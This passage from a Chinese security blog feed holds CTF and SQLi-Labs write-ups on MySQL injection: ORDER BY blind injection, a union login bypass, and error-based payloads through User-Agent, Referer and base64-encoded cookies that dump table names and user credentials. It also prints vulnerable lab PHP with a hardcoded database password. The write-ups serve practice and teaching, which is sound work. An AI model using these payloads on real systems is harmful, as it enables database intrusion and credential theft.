href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h1><p>1、首先我们创建一张admin表，包含id,username,password三个字段,然后插入测试数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/* sql</span><br><span class="line">     create  table `admin` (</span><br><span class="line">        `id` int(10) not null primary key auto_increment,</span><br><span class="line">        `username` varchar(20) not null ,</span><br><span class="line">        `password` varchar(32) not null</span><br><span class="line">     );</span><br><span class="line">  */</span><br></pre></td></tr></table></figure></p><p>测试数据如下<br><img src="/2018/04/19/mysql之利用order-by排序进行注入/flag4.png" alt="flag4"></p><p>2、我们使用union联合查询然后按照第三列(password)desc来排序查询结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where  username = &apos;admin&apos; union select 1,2,binary &apos;e&apos; order by 3 desc;</span><br></pre></td></tr></table></figure></p><p><img src="/2018/04/19/mysql之利用order-by排序进行注入/flag5.png" alt="flag5"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where  username = &apos;admin&apos; union select 1,2,binary &apos;f&apos; order by 3 desc;</span><br></pre></td></tr></table></figure></p><p><img src="/2018/04/19/mysql之利用order-by排序进行注入/flag6.png" alt="flag6"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where  username = &apos;admin&apos; union select 1,2,binary &apos;g&apos; order by 3 desc;</span><br></pre></td></tr></table></figure></p><p><img src="/2018/04/19/mysql之利用order-by排序进行注入/flag7.png" alt="flag7"><br>根据测试结果我们可以利用页面回显的username来判断password字段的值是否匹配，以此类推，我们就可以得到admin这个用户对应的password字段值了。<br><img src="/2018/04/19/mysql之利用order-by排序进行注入/buxin.jpg" alt="buxin"></p><h1 id="安恒杯2月月赛-进击的盲注"><a href="#安恒杯2月月赛-进击的盲注" class="headerlink" title="安恒杯2月月赛-进击的盲注"></a>安恒杯2月月赛-进击的盲注</h1><p>题目描述<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">题目名称</span><br><span class="line">进击的盲注</span><br><span class="line"></span><br><span class="line">题目说明</span><br><span class="line">这里的漏洞可不是什么通用型漏洞</span><br></pre></td></tr></table></figure></p><p>考点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">源代码泄露</span><br><span class="line">伪造password登录</span><br><span class="line">order by注入</span><br><span class="line">binary使用</span><br><span class="line">简单的条件竞争</span><br></pre></td></tr></table></figure></p><p>1、扫目录发现robots.txt,访问后发现有index.txt,有一个waf，过滤了<code>)(\</code>三个符号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function dbconnection()</span><br><span class="line">&#123;</span><br><span class="line">        @$con = mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;c2FkZmFnZGZkc3Nm&quot;);</span><br><span class="line">        // Check connection</span><br><span class="line">        if (!$con)</span><br><span class="line">        &#123;</span><br><span class="line">                echo &quot;Failed to connect to MySQL: &quot; . mysql_error();</span><br><span class="line">        &#125;</span><br><span class="line">        @mysql_select_db(&quot;blindsql&quot;,$con) or die ( &quot;Unable to connect to the database&quot;);</span><br><span class="line">        mysql_query(&quot;SET character set &apos;UTF8&apos;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">function waf($id)</span><br><span class="line">&#123;</span><br><span class="line">if(preg_match(&quot;/\(|\)|\\\\/&quot;, $id))</span><br><span class="line">return True;</span><br><span class="line">else</span><br><span class="line">return False;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;username&apos;])&amp;&amp;isset($_POST[&apos;password&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">$hit = &apos;&apos;;</span><br><span class="line">        dbconnection();</span><br><span class="line">$username = $_POST[&apos;username&apos;];</span><br><span class="line">$password = $_POST[&apos;password&apos;];</span><br><span class="line">if(waf($username))</span><br><span class="line">&#123;</span><br><span class="line">$hit = &quot;illegal character&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">$sql=&quot;SELECT * FROM admin WHERE username=&apos;&quot;.$username.&quot;&apos;&quot; ;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">@$row = mysql_fetch_array($result);</span><br><span class="line">#$name = $row[&apos;username&apos;];</span><br><span class="line">if(isset($row)&amp;&amp;$row[&apos;username&apos;]!=&quot;admin&quot;)&#123;</span><br><span class="line">$hit = &quot;username error!&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">if ($row[&apos;password&apos;]===md5($password))&#123;</span><br><span class="line">$hit = &apos;没啥用哦，还是到数据库里拿数据吧。&apos;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$hit = &quot;password error!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">        mysql_close();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>查看sql连接语句，伪造密码进行登录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM admin WHERE username=&apos;&quot;.$username.&quot;&apos;&quot; ;</span><br><span class="line"></span><br><span class="line">&apos; union select 1,&apos;admin&apos;,&apos;c4ca4238a0b923820dcc509a6f75849b&amp;password=1</span><br></pre></td></tr></table></figure></p><p>2、登陆后发现没有什么有用的信息<br><img src="/2018/04/19/mysql之利用order-by排序进行注入/denglu.png" alt="denglu"></p><p>3、这里我们同样使用了order by进行盲注，方法同上，这里就不多赘述了，需要注意的是这里如果不使用binary的话没办法区分大小写，得到的结果也是错的。<br><img src="/2018/04/19/mysql之利用order-by排序进行注入/payload.png" alt="payload"></p><p>4、这里得到了一个base64加密的一个页面(uP10@_nEw.php)</p><p>5、下面就是条件竞争上传一句话然后获取flag的过程了</p><p><a href="http://forum.91ctf.com/index.php/group/topic/id-38" target="_blank" rel="noopener">进击的盲注wp传送门</a></p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这里通过两个相同类型的题目介绍了order by盲注的方法，希望大家看完能有所收获（23333<br><img src="/2018/04/19/mysql之利用order-by排序进行注入/dicha.jpg" alt="dicha"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;突然发现更新完sqli基础关之后自己已经好久没有更新博客了，刚好最近又遇到了一些之前困扰了好久的问题，当时还不怎么理解sql注入，然后看了w
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ju5tw4nty0u.top/tags/CTF/"/>
    
      <category term="SQL" scheme="http://ju5tw4nty0u.top/tags/SQL/"/>
    
      <category term="WP" scheme="http://ju5tw4nty0u.top/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>SQL-LABS入门到放弃7（part1）</title>
    <link href="http://ju5tw4nty0u.top/2018/03/26/SQL-LABS%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%837%EF%BC%88part1%EF%BC%89/"/>
    <id>http://ju5tw4nty0u.top/2018/03/26/SQL-LABS入门到放弃7（part1）/</id>
    <published>2018-03-26T09:15:17.000Z</published>
    <updated>2018-03-26T16:45:12.706Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>接下去的几个关卡涉及到了http头部的一些内容，我们需要简单的了解一下这些http头部字段。<br><a href="https://www.cnblogs.com/jiangxiaobo/p/5499488.html" target="_blank" rel="noopener">详细介绍</a></p><h2 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a>User-Agent</h2><p>浏览器表明自己的身份（是哪种浏览器）;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">例如：User-Agent：Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; </span><br><span class="line">rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14</span><br></pre></td></tr></table></figure></p><h2 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h2><p>浏览器向 WEB 服务器表明自己是从哪个 网页/URL 获得/点击 当前请求中的网址/URL；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例如：Referer：http://www.sina.com/</span><br></pre></td></tr></table></figure></p><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>指某些网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据（通常经过加密）；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie：userId=C5bYpXrimdmsiQmsBPnE1Vn8ZQmdWSm3WRlEB3vRwTnRtW &lt;-- Cookie</span><br></pre></td></tr></table></figure></p><h1 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h1><ol><li><p>题目提示<code>Less-18 Header Injection- Error Based- string</code><br>这里我们查看源码可知这里对uname和passwd都进行了预处理，我们没办法通过这两个参数注入；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$uname = check_input($_POST[&apos;uname&apos;]);</span><br><span class="line">$passwd = check_input($_POST[&apos;passwd&apos;]);</span><br></pre></td></tr></table></figure></li><li><p>查看SQL查询语句,发现可以通过uagent进行注入；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</span><br><span class="line"></span><br><span class="line">$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&apos;$uagent&apos;, &apos;$IP&apos;, $uname)&quot;;</span><br></pre></td></tr></table></figure></li><li><p>构造报错语句(这里使用的是单引号处理参数，需要注意闭合单引号)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 2,1),0x7e)) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></li></ol><h1 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h1><ol><li><p>题目提示<code>Less-19 Header Injection- Referer- Error Based- string</code><br>这里应该注入点是<code>referer</code>，查看关键源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$uname = check_input($_POST[&apos;uname&apos;]);</span><br><span class="line">$passwd = check_input($_POST[&apos;passwd&apos;]);</span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</span><br><span class="line"></span><br><span class="line">$insert=&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&apos;$uagent&apos;, &apos;$IP&apos;)&quot;;</span><br></pre></td></tr></table></figure></li><li><p>构造报错语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&apos;and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 2,1),0x7e)) and &apos;1&apos;=&apos;1</span><br><span class="line"></span><br><span class="line">&apos;and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></li></ol><h1 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h1><ol><li><p>题目提示<code>Less-20 Cookie Injection- Error Based- string</code><br>这里应该是利用cookie进行注入，查看关键源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$uname = check_input($_POST[&apos;uname&apos;]);</span><br><span class="line">$passwd = check_input($_POST[&apos;passwd&apos;]);</span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE username=&apos;$cookee&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure></li><li><p>从源代码我们可以看到cookie从username中获取值，当再次刷新时，会从cookie中读取username，然后进行查询，登陆成功后，当我们修改cookie，再次刷新时，sql语句就会被修改了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cookie:uname=admin1&apos;and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 2,1),0x7e))#</span><br><span class="line"></span><br><span class="line">cookie:uname=admin1&apos;and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)#</span><br></pre></td></tr></table></figure></li></ol><h1 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h1><ol><li><p>题目提示<code>Less-21 Cookie Injection- Error Based- complex - string</code><br>这里应该还是cookie注入，不过需要做一下base64编码（cookie该有单引号和括号的处理）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$uname = check_input($_POST[&apos;uname&apos;]);</span><br><span class="line">$passwd = check_input($_POST[&apos;passwd&apos;]);</span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</span><br><span class="line"></span><br><span class="line">$cookee = base64_decode($cookee);</span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE username=(&apos;$cookee&apos;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure></li><li><p>我们将SQL语句先base64编码然后进行报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">编码前：</span><br><span class="line">admin&apos;) and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)#</span><br><span class="line"></span><br><span class="line">编码后：</span><br><span class="line">YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCB0YWJsZV9uYW1lIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWE9ZGF0YWJhc2UoKSBsaW1pdCAwLDEpLDB4N2UpLDEpIw==</span><br><span class="line"></span><br><span class="line">编码前：</span><br><span class="line">admin&apos;) and (select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM users limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#</span><br><span class="line"></span><br><span class="line">编码后：</span><br><span class="line">YWRtaW4nKSBhbmQgKHNlbGVjdCAxIGZyb20oc2VsZWN0IGNvdW50KCopLGNvbmNhdCgoc2VsZWN0IChzZWxlY3QgKFNFTEVDVCBkaXN0aW5jdCBjb25jYXQoMHgyMyx1c2VybmFtZSwweDNhLHBhc3N3b3JkLDB4MjMpIEZST00gdXNlcnMgbGltaXQgMCwxKSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIGxpbWl0IDAsMSksZmxvb3IocmFuZCgwKSoyKSl4IGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyBncm91cCBieSB4KWEpIw==</span><br></pre></td></tr></table></figure></li></ol><h1 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h1><ol><li><p>题目提示<code>Less-22 Cookie Injection- Error Based- Double Quotes - string</code><br>应该是进行双引号的处理，我们通过测试<code>admin&quot;</code>验证了这一想法;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">your MySQL server version for the right syntax to use near &apos;&quot;admin&quot;&quot; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure></li><li><p>关键源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$uname = check_input($_POST[&apos;uname&apos;]);</span><br><span class="line">$passwd = check_input($_POST[&apos;passwd&apos;]);</span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</span><br><span class="line"></span><br><span class="line">$cookee = base64_decode($cookee);</span><br><span class="line">$cookee1 = &apos;&quot;&apos;. $cookee. &apos;&quot;&apos;;</span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure></li><li><p>我们将SQL语句先base64编码然后进行报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">编码前：</span><br><span class="line">admin&quot; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)#</span><br><span class="line"></span><br><span class="line">编码后：</span><br><span class="line">YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IHRhYmxlX25hbWUgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpIGxpbWl0IDAsMSksMHg3ZSksMSkj</span><br><span class="line"></span><br><span class="line">编码前：</span><br><span class="line">admin&quot; and (select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM users limit 2,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#</span><br><span class="line"></span><br><span class="line">编码后：</span><br><span class="line">YWRtaW4iIGFuZCAoc2VsZWN0IDEgZnJvbShzZWxlY3QgY291bnQoKiksY29uY2F0KChzZWxlY3QgKHNlbGVjdCAoU0VMRUNUIGRpc3RpbmN0IGNvbmNhdCgweDIzLHVzZXJuYW1lLDB4M2EscGFzc3dvcmQsMHgyMykgRlJPTSB1c2VycyBsaW1pdCAyLDEpKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgbGltaXQgMCwxKSxmbG9vcihyYW5kKDApKjIpKXggZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIGdyb3VwIGJ5IHgpYSkj</span><br></pre></td></tr></table></figure></li></ol><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这里只使用了报错注入，没有对联合注入和盲注进行尝试（有点迷），感觉应该是一样的，你留下一个问题以后补充。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;接下去的几个关卡涉及到了http头部的一些内容，我们需要简单的了解一下这些http头部字段。&lt;br&gt;&lt;a href=&quot;https://www
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ju5tw4nty0u.top/tags/CTF/"/>
    
      <category term="SQL" scheme="http://ju5tw4nty0u.top/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>SQL-LABS入门到放弃6（part1）</title>
    <link href="http://ju5tw4nty0u.top/2018/03/26/SQL-LABS%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%836%EF%BC%88part1%EF%BC%89/"/>
    <id>http://ju5tw4nty0u.top/2018/03/26/SQL-LABS入门到放弃6（part1）/</id>
    <published>2018-03-26T08:10:38.000Z</published>
    <updated>2018-03-26T09:09:22.829Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在开始解题之前，我们先来了解几个数据库函数（增删改查）<br><a href="https://www.cnblogs.com/daxueshan/p/6687521.html" target="_blank" rel="noopener">函数介绍传送门</a></p><h1 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h1><ol><li><p>可以看到是一个修改密码的页面，利用的是update语句，首先我们找注入点，当输入<code>uname=admin&amp;passwd=ju5tw4nty0u&#39;&amp;submit=Submit</code>时报错，可知对passwd的处理为单引号；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;admin&apos;&apos; at line 1</span><br></pre></td></tr></table></figure></li><li><p>因为这里没有具体回显，所以可以使用报错注入或者盲注；</p></li><li><p>报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=ju5tw4nty0u&apos; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 2,1),0x7e))# &amp;submit=Submit</span><br></pre></td></tr></table></figure></li><li><p>盲注参考Less-5；</p></li></ol><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这题是看了源码才把注意力放在password的，之前一直在试用uname进行注入，然后找了好久没有头绪，后面在源码看到了<code>check_input()</code>函数，这里对uname做了处理，我们可以看看源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function check_input($value)</span><br><span class="line">&#123;</span><br><span class="line">if(!empty($value))</span><br><span class="line">&#123;</span><br><span class="line">// truncation (see comments)</span><br><span class="line">$value = substr($value,0,15);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Stripslashes if magic quotes enabled</span><br><span class="line">if (get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line">$value = stripslashes($value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Quote if not a number</span><br><span class="line">if (!ctype_digit($value))</span><br><span class="line">&#123;</span><br><span class="line">$value = &quot;&apos;&quot; . mysql_real_escape_string($value) . &quot;&apos;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">$value = intval($value);</span><br><span class="line">&#125;</span><br><span class="line">return $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>对参数的处理：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$uname=check_input($_POST[&apos;uname&apos;]);  </span><br><span class="line">$passwd=$_POST[&apos;passwd&apos;];</span><br></pre></td></tr></table></figure></p><p>这里涉及到几个函数：</p><h2 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes()"></a>addslashes()</h2><p>在预定义字符之前添加反斜杠的字符串<br><a href="http://www.w3school.com.cn/php/func_string_addslashes.asp" target="_blank" rel="noopener">详细介绍</a></p><h2 id="get-magic-quotes-gpc"><a href="#get-magic-quotes-gpc" class="headerlink" title="get_magic_quotes_gpc()"></a>get_magic_quotes_gpc()</h2><p><a href="http://php.net/manual/zh/function.get-magic-quotes-gpc.php" target="_blank" rel="noopener">详细介绍</a></p><h2 id="stripslashes"><a href="#stripslashes" class="headerlink" title="stripslashes()"></a>stripslashes()</h2><p>删除由addslashes函数添加的反斜杠<br><a href="http://www.w3school.com.cn/php/func_string_stripslashes.asp" target="_blank" rel="noopener">详细介绍</a></p><h2 id="mysql-real-escape-string"><a href="#mysql-real-escape-string" class="headerlink" title="mysql_real_escape_string()"></a>mysql_real_escape_string()</h2><p>转义SQL语句中使用的字符串中的特殊字符<br><a href="http://www.w3school.com.cn/php/func_mysql_real_escape_string.asp" target="_blank" rel="noopener">详细介绍</a></p><p>因为对username的输入做了各种转义处理，所以不能使用uname进行注入。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;在开始解题之前，我们先来了解几个数据库函数（增删改查）&lt;br&gt;&lt;a href=&quot;https://www.cnblogs.com/daxues
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ju5tw4nty0u.top/tags/CTF/"/>
    
      <category term="SQL" scheme="http://ju5tw4nty0u.top/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>SQL-LABS入门到放弃5（part1）</title>
    <link href="http://ju5tw4nty0u.top/2018/03/23/SQL-LABS%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%835%EF%BC%88part1%EF%BC%89/"/>
    <id>http://ju5tw4nty0u.top/2018/03/23/SQL-LABS入门到放弃5（part1）/</id>
    <published>2018-03-23T10:15:54.000Z</published>
    <updated>2018-03-26T09:12:36.358Z</updated>
    
